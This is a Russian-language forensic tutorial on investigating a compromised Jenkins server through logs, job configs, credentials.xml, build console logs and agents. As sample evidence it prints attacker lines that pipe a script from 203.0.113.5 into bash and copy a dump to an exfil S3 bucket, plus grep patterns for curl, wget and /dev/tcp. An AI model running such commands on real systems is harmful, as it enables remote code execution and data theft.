## Вопрос, с которого всё начинается

Jenkins даёт **RCE по дизайну** (скрипт-консоль, пайплайны). Компромисс CI-сервера
критичен: у него доступ к коду, секретам и продакшену. Разберём.

## Наш пример: Jenkins

## Шаг 1: доступ и логи

```
$ ls /var/log/jenkins/
jenkins.log
$ grep -i 'script\|groovy' jenkins.log | tail
```

Jenkins логирует запуск скриптов и джоб.

## Шаг 2: скрипт-консоль

`/script` позволяет выполнять Groovy на сервере:

```
$ grep 'script' /var/log/jenkins/access_log* | tail
203.0.113.5 - "POST /script HTTP/1.1" 200
```

Внешний доступ к `/script` — почти наверняка RCE.

## Шаг 3: креденшелы

Jenkins хранит секреты. Проверь:

- список credentials (кто добавлял);
- `config.xml` джоб (команды);
- историю изменений джоб.

```
$ ls /var/lib/jenkins/credentials.xml
```

## Шаг 4: джобы

Злоумышленник может создать джобу, выполняющую команды:

```
$ grep -rl 'curl\|bash -i' /var/lib/jenkins/jobs/*/config.xml
```

## Шаг 5: что искать

- обращения к `/script`, `/manage`;
- новые/изменённые джобы;
- утечку креденшелов;
- команды, тянущие внешние скрипты;
- новые пользователи/API-токены.

## Шаг 6: где Jenkins хранит данные

Jenkins — это Java-приложение, и все его данные лежат в каталоге `JENKINS_HOME` (обычно `/var/lib/jenkins`). Разберём, что там:

```
$ ls /var/lib/jenkins
config.xml  credentials.xml  jobs/  nodes/  plugins/  secrets/  users/  workspace/
```

- `config.xml` — глобальные настройки;
- `credentials.xml` — сохранённые креденшелы (в зашифрованном виде);
- `jobs/` — определения заданий и история сборок;
- `secrets/` — ключи шифрования;
- `nodes/` — подключённые агенты.

Это и есть «место преступления»: здесь и настройки, и следы запусков. В расследовании мы фиксируем снимок этого каталога до любых изменений.

## Шаг 7: зачем атакующему креденшелы

`credentials.xml` хранит секреты не открытым текстом, а зашифрованными мастер-ключом из `secrets/`. Именно поэтому злоумышленник, получивший доступ к файловой системе, может их расшифровать:

```
$ grep -o '<id>[^<]*</id>' /var/lib/jenkins/credentials.xml
<id>deploy-key</id>
<id>aws-prod</id>
```

Наличие таких записей объясняет, **зачем** лезли в Jenkins: чтобы добраться до ключей деплоя и облака. Фиксируем, какие креденшелы существовали на момент инцидента, и считаем их скомпрометированными.

## Шаг 8: сборки как источник команд

Каждая сборка пишет консольный лог — `jobs/<имя>/builds/<номер>/log`. Там видно всё, что выполнялось:

```
$ grep -rE 'curl|wget|base64|/dev/tcp' /var/lib/jenkins/jobs/*/builds/*/log | head
+ curl -s http://203.0.113.5/stage2.sh | bash
```

Такая строка — прямой признак выполнения чужого кода в конвейере. Сопоставляем номер сборки со временем: когда это началось.

## Шаг 9: кто и когда запустил

Jenkins пишет причину запуска — `cause`:

```
$ grep -r 'Started by' /var/lib/jenkins/jobs/*/builds/*/log | head
Started by user admin
Started by timer
```

«Started by user» с необычным пользователем или запуск из ветки, которую никто не менял, — зацепка. Дальше сверяем с логами аутентификации Jenkins (`/var/log/jenkins/jenkins.log`): откуда заходили и с какого IP.

## Шаг 10: что делать с найденным

- перечислить все креденшелы из `credentials.xml` и отозвать их;
- проверить, какие задания менялись и кто их запускал;
- просмотреть установленные плагины на уязвимые версии;
- сопоставить входы в Jenkins с внешними IP;
- зафиксировать хронологию: вход → правка задания → сборка → команда.

## Шаг 11: Freestyle против Pipeline

Задания Jenkins бывают двух видов. **Freestyle** настраивается мышкой и хранится в `config.xml` задания. **Pipeline** описывается кодом (Jenkinsfile) и обычно лежит в самом репозитории:

```
pipeline {
  agent any
  stages {
    stage('build') { steps { sh 'make' } }
  }
}
```

Если атакующий правил `Jenkinsfile`, это видно в истории git того же репозитория — две системы следов пересекаются. Если правил Freestyle — только в `config.xml` и в аудите Jenkins.

## Шаг 12: агенты и выход в сеть

Jenkins может управлять другими машинами через агентов (nodes):

```
$ ls /var/lib/jenkins/nodes/
build-agent-1/  build-agent-2/
$ grep -i 'host\|credentialId' /var/lib/jenkins/nodes/*/config.xml
<host>10.0.0.20</host>
```

Каждый агент — это ещё одна точка входа. В расследовании мы смотрим, с каких агентов запускались сборки после компромисса: так строим карту бокового перемещения. Креденшелы агентов лежат в общем `credentials.xml`, поэтому утечка Jenkins часто означает доступ и к агентам.

## Шаг 13: восстановление удалённых заданий

Удалённое задание не исчезает мгновенно: каталог `jobs/<имя>` остаётся до перезагрузки конфигурации, а история сборок — в `jobs/<имя>/builds/`. Даже если задание переименовали, старые каталоги сохраняют `nextBuildNumber` и логи. Для форензики это значит: «вредоносное задание», которое почистили, можно найти по остаткам каталогов и по ссылкам на него в логах сборок других заданий.

## Шаг 14: сводим хронологию

Порядок восстановления событий:

1. вход в Jenkins (логи аутентификации, IP);
2. правка задания или установка плагина (`config.xml`, плагины);
3. запуск сборки и её причина («Started by …»);
4. команды в консольном логе;
5. использование украденных креденшелов во внешних системах.

Каждый шаг подтверждается своим артефактом, и вместе они дают цельную картину инцидента.

## Практика: разбор одного задания

Разберём реальную цепочку. В `jobs/deploy/builds/42/log` находим:

```
$ sed -n '1,12p' /var/lib/jenkins/jobs/deploy/builds/42/log
Started by user build-bot
Building in workspace /var/lib/jenkins/workspace/deploy
+ git fetch --all
+ sh -c 'curl -s http://203.0.113.5/p.sh | bash'
+ aws s3 cp ./dump s3://exfil-bucket/
```

Читаем построчно. Строка «Started by user build-bot» — инициатор. `git fetch --all` — обычное действие. А вот `curl … | bash` — запуск внешнего скрипта, и `aws s3 cp … s3://exfil-bucket` — выгрузка данных наружу. Значит, задание было изменено так, чтобы при каждой сборке красть данные.

Дальше проверяем, кто и когда правил задание:

```
$ ls -l --time-style=full-iso /var/lib/jenkins/jobs/deploy/config.xml
2026-01-14 03:18:44 ...
```

Время правки совпадает со временем входа в Jenkins. Сверяем IP из `jenkins.log` — и получаем цельную картину: вход с чужого адреса, правка конфигурации, выгрузка данных.

## Что важно в таких делах

- Консольный лог — это **точная** запись выполненных команд; она не «врёт».
- Причину запуска (`Started by`) подделать сложнее, чем удалить лог.
- Время правки `config.xml` связывает действие с сессией.
- Выгрузка наружу (S3, curl) — прямой признак эксфильтрации.

Итог: даже после чистки журналов связка «лог сборки + время файла + лог входа» восстанавливает атаку.

## Что мы теперь знаем

- Jenkins = RCE по дизайну (Groovy).
- `/script` и `/manage` — опасные эндпоинты.
- Креденшелы хранятся на сервере.
- Джобы содержат команды.
- Ищем скрипты, джобы, токены.

- `JENKINS_HOME` — все данные Jenkins в одном каталоге.
- `credentials.xml` + `secrets/` дают сохранённые ключи.
- Консольные логи сборок содержат выполненные команды.
- Причина запуска («Started by …») указывает инициатора.
- Jenkins-лог показывает входы и IP.

- Freestyle хранится в `config.xml`; Pipeline — в Jenkinsfile репозитория.
- Агенты (nodes) — дополнительные точки входа и бокового движения.
- Удалённые задания оставляют каталоги и историю сборок.
- Хронология: вход → правка → сборка → команды → использование ключей.

## Если не сработало

- Логи усечены? Смотри audit-плагин.
- Креденшелы зашифрованы? Нужен ключ Jenkins.
- Нужен контекст? Читай историю SCM.
